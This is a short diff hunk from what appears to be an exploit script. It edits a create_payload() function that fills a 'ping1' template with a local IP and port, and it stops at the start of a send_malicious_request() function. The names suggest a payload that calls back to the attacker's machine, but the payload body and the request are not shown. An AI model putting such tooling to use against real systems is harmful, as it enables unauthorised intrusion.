@@ -89,9 +89,10 @@ def create_payload():
     with open("ping1.template", "r") as file:
         template = file.read()
     # Replace Windows line endings with Unix line endings
-    template = template.replace('\r\n', '\n')
-    with open("ping1", "w") as file:
-        file.write(template.replace("{{LOCAL_IP}}", LOCAL_IP).replace("{{PORT}}", str(PORT)))
+    # template = template.replace('\r\n', '\n')
+    template = template.replace("{{LOCAL_IP}}", LOCAL_IP).replace("{{PORT}}", str(PORT))
+    with open("ping1", "wb") as file:
+        file.write(template.encode())
 
 def send_malicious_request():
     # Target URL
